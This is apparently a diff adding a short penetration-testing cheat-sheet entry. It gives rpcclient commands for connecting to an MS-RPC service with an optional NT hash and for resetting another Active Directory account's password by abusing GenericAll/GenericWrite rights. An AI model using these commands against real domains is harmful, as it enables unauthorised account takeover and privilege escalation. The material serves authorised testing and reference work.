@@ -1,0 +1,5 @@
+# Connect to MS-RPC service
+rpcclient -W DOMAIN -U USER [--pw-nt-hash] HOST
+
+# Reset password of another account (with GenericAll/GenericWrite permissions)
+> setuserinfo2 ACCOUNT 23 PASSWORD
